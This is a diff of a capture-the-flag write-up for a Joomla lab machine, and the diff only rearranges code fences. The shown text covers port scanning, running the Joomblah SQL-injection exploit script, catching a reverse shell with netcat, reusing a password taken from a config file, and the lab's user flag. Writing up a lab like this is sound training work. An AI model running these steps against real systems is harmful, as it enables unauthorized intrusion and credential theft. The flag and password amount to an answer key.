@@ -28,9 +28,6 @@ Initial reconnaissance narrows the attack surface by establishing public service
 We run the following command to enumerate reachable services and reduce the unknown attack surface. At this stage, the objective is to identify exposed ports, service versions, and any obvious misconfigurations. The output guides which endpoint should be prioritized for deeper exploitation.
 ```bash
 rustscan -a $ip --ulimit 5000 -- -A -sV
-```
-
-```bash
 ┌──(root㉿LAPTOP-P490FVC2)-[~]
 └─# rustscan -a $ip --ulimit 5000 -- -A -sV
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -177,8 +174,6 @@ nmap -p- -sC -sV -T4 -A $ip
 We run the following command to enumerate reachable services and reduce the unknown attack surface. At this stage, the objective is to identify exposed ports, service versions, and any obvious misconfigurations. The output guides which endpoint should be prioritized for deeper exploitation.
 ```bash
 nmap -p- -sC -sV -T4 -A $ip
-```
-```bash
 ✅[22:25][CPU:2][MEM:9][IP:172.17.0.1][/home/n0z0]
 🐉 > nmap -p- -sC -sV -T4 -A $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 22:26 JST
@@ -241,8 +236,6 @@ This section records the steps from initial intrusion to obtaining a user shell.
 At this point, we execute the command to turn enumeration findings into a practical foothold. The goal is to obtain either code execution, reusable credentials, or a stable interactive shell. Relevant options are preserved so the step can be repeated exactly during verification.
 ```bash
 nmap -p- -sC -sV -T4 -A $ip
-```
-```bash
 ✅[22:25][CPU:2][MEM:9][IP:172.17.0.1][/home/n0z0]
 🐉 > nmap -p- -sC -sV -T4 -A $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 22:26 JST
@@ -683,9 +676,6 @@ When using Joomla, you can scan with the scan tool
 
 ```bash
 joomscan --url http://$ip
-```
-
-```bash
     ____  _____  _____  __  __  ___   ___    __    _  _
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
   .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
@@ -761,8 +751,6 @@ Use a scan tool to obtain user and password hashes
 At this point, we execute the command to turn enumeration findings into a practical foothold. The goal is to obtain either code execution, reusable credentials, or a stable interactive shell. Relevant options are preserved so the step can be repeated exactly during verification.
 ```bash
 python /home/n0z0/tools/exploits/Joomblah/joomblah.py http://$ip/
-```
-```bash
 ✅[11:15][CPU:1][MEM:47][IP:10.11.87.75][...0/tools/exploits/Joomblah]
 🐉 > python /home/n0z0/tools/exploits/Joomblah/joomblah.py http://$ip/
 /home/n0z0/tools/exploits/Joomblah/joomblah.py:158: SyntaxWarning: invalid escape sequence '\ '
@@ -843,8 +831,6 @@ At this point, we execute the command to turn enumeration findings into a practi
 nc -lvnp 3333
 sh: no job control in this shell
 sh-4.2$ uname -r
-```
-```bash
 ❌[22:57][CPU:0][MEM:47][IP:10.11.87.75][...n0z0/work/thm/Daily_Bugle]
 🐉 > nc -lvnp 3333
 listening on [any] 3333 ...
@@ -868,16 +854,10 @@ Switch the user and first get user.txt
 /var/www/html/libraries/joomla/log/logger/database.php:                 $this->password = null;
 /var/www/html/libraries/joomla/log/logger/database.php:                 'password' => $this->password,
 
-```
-
-```bash
 drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
 sh-4.2$ su jjameson
 su jjameson
 Password: nv5uz9r3ZEDzVjNu
-```
-
-```bash
 cat user.txt
 27a260fe3cba712cfdedb1c86d80442e
 ```
